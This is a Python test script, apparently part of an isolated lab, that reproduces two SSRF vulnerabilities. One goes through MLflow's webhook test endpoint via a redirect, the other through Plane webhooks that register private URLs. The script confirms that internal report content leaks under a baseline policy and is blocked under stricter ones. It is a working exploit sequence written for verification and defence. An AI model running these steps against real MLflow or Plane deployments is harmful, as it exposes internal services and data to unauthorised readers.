"""Run only against this repository's isolated synthetic CVE lab.

The script verifies the two historical SSRF primitives without targeting a real
MLflow/Plane deployment, cloud metadata service, or non-lab address.
"""
import argparse
import json
import os
import time
import uuid
from pathlib import Path
from urllib.error import HTTPError
from urllib.request import HTTPSHandler, ProxyHandler, Request, build_opener
import ssl


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base", default=os.getenv("LAB_BASE_URL", "http://webhook:8000"))
    parser.add_argument("--receiver", default=os.getenv("RECEIVER_URL", "https://receiver:8443"))
    parser.add_argument("--internal", default=os.getenv("REPORT_API_URL", "http://internal:8000/reports/alpha"))
    parser.add_argument("--observer", default=os.getenv("OBSERVER_URL", "http://internal:8000"))
    parser.add_argument("--ca", default=os.getenv("CA_FILE", "/certs/ca.pem"))
    parser.add_argument("--policy", choices=("baseline", "reject", "strict"), required=True)
    parser.add_argument("--output", required=True)
    args = parser.parse_args()

    expected_vulnerable = args.policy == "baseline"
    context = ssl.create_default_context(cafile=args.ca)
    opener = build_opener(ProxyHandler({}), HTTPSHandler(context=context))
    results = {
        "mock_only": True,
        "policy": args.policy,
        "expected_vulnerable": expected_vulnerable,
        "endpoints": {
            "mlflow": "/api/2.0/mlflow/webhooks/{id}/test",
            "plane": "/api/cve/plane/workspaces/{workspace}/webhooks",
        },
        "mlflow": {},
        "plane": {},
    }

    def call(url, method="GET", body=None, token=None, expected=200):
        headers = {"Content-Type": "application/json"}
        if token:
            headers["Authorization"] = "Bearer " + token
        request = Request(url, data=json.dumps(body).encode("utf-8") if body is not None else None,
                          headers=headers, method=method)
        try:
            response = opener.open(request, timeout=30)
        except HTTPError as error:
            response = error
        with response:
            payload = json.load(response)
            if response.status != expected:
                raise AssertionError((url, response.status, expected, payload))
            return payload

    def observation(run_id):
        return call(args.observer + "/observations?run_id=" + run_id)

    def wait_for_delivery(workspace, run_id, hook_id, token):
        deadline = time.monotonic() + 30
        while True:
            rows = call(args.base + f"/api/workspaces/{workspace}/deliveries?run_id={run_id}", token=token)["deliveries"]
            delivery = next((row for row in rows if row["hook_id"] == hook_id), None)
            if delivery and delivery["state"] not in ("queued", "sending"):
                return delivery
            if time.monotonic() >= deadline:
                raise AssertionError("Plane mock worker did not finish")
            time.sleep(0.1)

    plane_hook = None
    plane_workspace = None
    try:
        # MLflow CVE-2026-64849: direct private first-hop registration remains
        # rejected, but a trusted-looking HTTPS redirect reaches the synthetic
        # internal report in baseline mode and the /test result reads it back.
        mlflow_negative_run = str(uuid.uuid4())
        results["mlflow"]["direct_internal_registration"] = call(
            args.base + "/api/2.0/mlflow/webhooks", "POST", {
                "name": "direct-internal-negative-control", "url": args.internal,
                "events": [{"entity": "REGISTERED_MODEL", "action": "CREATED"}],
                "run_id": mlflow_negative_run,
            }, expected=400)
        assert results["mlflow"]["direct_internal_registration"]["decision"] == "denied"

        mlflow_create_run = str(uuid.uuid4())
        mlflow_created = call(args.base + "/api/2.0/mlflow/webhooks", "POST", {
            "name": "public-looking-tls-redirect", "url": args.receiver + "/redirect?status=302",
            "events": [{"entity": "REGISTERED_MODEL", "action": "CREATED"}],
            "run_id": mlflow_create_run,
        })
        mlflow_hook = mlflow_created["webhook"]["webhook_id"]
        mlflow_run = str(uuid.uuid4())
        # No Bearer token is passed: this is intentional and only works under
        # the acknowledgement-gated mock profile.
        mlflow_test = call(args.base + f"/api/2.0/mlflow/webhooks/{mlflow_hook}/test", "POST", {
            "webhook_id": mlflow_hook,
            "event": {"entity": "REGISTERED_MODEL", "action": "CREATED"},
            "run_id": mlflow_run,
        })
        mlflow_observation = observation(mlflow_run)
        mlflow_body = mlflow_test["result"]["response_body"] or ""
        mlflow_exposed = "REPORT-" + mlflow_run in mlflow_body
        assert mlflow_test["result"]["success"] == expected_vulnerable, mlflow_test
        assert mlflow_observation["internal_api_reached"] == expected_vulnerable, mlflow_observation
        assert mlflow_exposed == expected_vulnerable, mlflow_test
        results["mlflow"].update({
            "registration": mlflow_created,
            "run_id": mlflow_run,
            "test_result": mlflow_test,
            "internal_observation": mlflow_observation,
            "internal_api_reached": mlflow_observation["internal_api_reached"],
            "report_content_exposed": mlflow_exposed,
        })

        # Plane CVE-2026-30242: a workspace ADMIN directly registers the
        # synthetic Docker-private report URL.  No redirect is required; the
        # queued delivery's stored log is the read-back channel.
        customer = os.getenv("CUSTOMER_TOKEN", "lab-customer-token")
        other_workspace_user = os.getenv("OTHER_WORKSPACE_TOKEN", "lab-bob-token")
        plane_workspace = call(args.base + "/api/workspaces", "POST", {
            "name": "plane-cve-" + str(uuid.uuid4()),
        }, token=customer, expected=201)["id"]
        plane_negative_run = str(uuid.uuid4())
        results["plane"]["loopback_negative_control"] = call(
            args.base + f"/api/cve/plane/workspaces/{plane_workspace}/webhooks", "POST", {
                "name": "loopback-negative-control", "url": "http://127.0.0.1:1/",
                "events": ["issue.updated"], "run_id": plane_negative_run,
            }, token=customer, expected=400)

        plane_registration_run = str(uuid.uuid4())
        plane_status = 201 if expected_vulnerable else 400
        plane_created = call(args.base + f"/api/cve/plane/workspaces/{plane_workspace}/webhooks", "POST", {
            "name": "direct-private-report", "url": args.internal,
            "events": ["issue.updated"], "run_id": plane_registration_run,
        }, token=customer, expected=plane_status)
        results["plane"]["registration"] = plane_created
        results["plane"]["registration_run_id"] = plane_registration_run
        if expected_vulnerable:
            plane_hook = plane_created["id"]
            plane_run = str(uuid.uuid4())
            queued = call(args.base + f"/api/workspaces/{plane_workspace}/events", "POST", {
                "event": "issue.updated", "run_id": plane_run,
            }, token=customer, expected=202)
            assert len(queued["delivery_ids"]) == 1, queued
            delivery = wait_for_delivery(plane_workspace, plane_run, plane_hook, customer)
            plane_observation = observation(plane_run)
            plane_body = delivery["result"]["body"] or ""
            plane_exposed = "REPORT-" + plane_run in plane_body
            assert delivery["state"] == "succeeded", delivery
            assert plane_observation["internal_api_reached"], plane_observation
            assert plane_exposed, delivery
            forbidden = call(args.base + f"/api/workspaces/{plane_workspace}/deliveries?run_id={plane_run}",
                             token=other_workspace_user, expected=403)
            results["plane"].update({
                "run_id": plane_run,
                "queued": queued,
                "delivery_log": delivery,
                "internal_observation": plane_observation,
                "other_workspace_log_query": forbidden,
                "internal_api_reached": plane_observation["internal_api_reached"],
                "report_content_exposed": plane_exposed,
            })
        else:
            plane_observation = observation(plane_registration_run)
            assert not plane_observation["internal_api_reached"], plane_observation
            results["plane"].update({
                "internal_observation": plane_observation,
                "internal_api_reached": False,
                "report_content_exposed": False,
            })
        results["passed"] = True
    except Exception as error:
        results["passed"] = False
        results["failure"] = str(error)
        raise
    finally:
        if plane_hook and plane_workspace:
            try:
                call(args.base + f"/api/workspaces/{plane_workspace}/hooks/{plane_hook}", "DELETE",
                     token=os.getenv("CUSTOMER_TOKEN", "lab-customer-token"))
            except Exception as error:  # Preserve primary assertion failure.
                results["cleanup_error"] = str(error)
        output = Path(args.output)
        output.parent.mkdir(parents=True, exist_ok=True)
        output.write_text(json.dumps(results, ensure_ascii=False, indent=2), encoding="utf-8")
    print(json.dumps({"passed": True, "policy": args.policy, "output": args.output}))


if __name__ == "__main__":
    main()
